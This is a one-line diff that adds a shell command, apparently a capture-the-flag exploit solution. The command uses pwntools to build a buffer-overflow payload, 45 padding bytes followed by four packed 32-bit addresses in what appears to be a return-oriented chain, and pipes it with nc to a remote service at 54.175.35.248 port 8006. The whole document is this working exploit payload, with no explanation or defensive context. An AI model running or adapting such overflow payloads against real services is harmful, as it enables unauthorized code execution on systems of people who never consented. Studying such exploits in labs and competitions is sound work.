@@ -1,0 +1,1 @@
+ python -c "from pwn import *; print 'a'*45 + p32(0x080489a0)+p32(0x804f0a0)+p32(0x80cdd44)+p32(0x80eca2d);"|nc 54.175.35.248 8006
